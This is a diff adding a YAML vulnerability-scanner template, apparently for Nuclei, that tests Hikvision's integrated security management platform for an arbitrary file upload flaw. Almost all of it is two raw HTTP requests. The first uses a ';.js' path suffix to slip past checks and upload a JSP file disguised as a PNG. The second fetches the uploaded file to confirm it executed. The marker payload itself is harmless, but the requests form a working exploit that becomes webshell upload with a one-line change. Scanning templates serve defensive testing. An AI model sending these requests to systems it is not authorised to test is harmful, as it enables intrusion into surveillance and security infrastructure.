@@ -1,0 +1,47 @@
+id: Hikvision_37
+info:
+  name: 海康威视综合安防管理平台clusters接口存在任意文件上传漏洞
+  author: YanXi
+  severity: medium
+  description: description
+  reference:
+    - https://wiki.wy876.cn/
+  tags: Hikvision
+http:
+  - raw:
+      - |
+        POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+        Chrome/112.0.0.0 Safari/537.36 HTML
+        Accept: */*
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+        Content-Length: 339
+
+        ----------------------------984514492333278399715408
+        Content-Disposition: form-data; name="file"; filename="languages/default.jsp"
+        Content-Type: image/png
+
+        <%=123%>
+        ----------------------------984514492333278399715408
+        Content-Disposition: form-data; name="proxyAddress"
+
+        {{Hostname}}
+        ----------------------------984514492333278399715408--
+      - |+
+        GET /clusterMgr/languages/default.jsp;.js HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+        Chrome/112.0.0.0 Safari/537.36 HTML
+        Accept: */*
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '123'
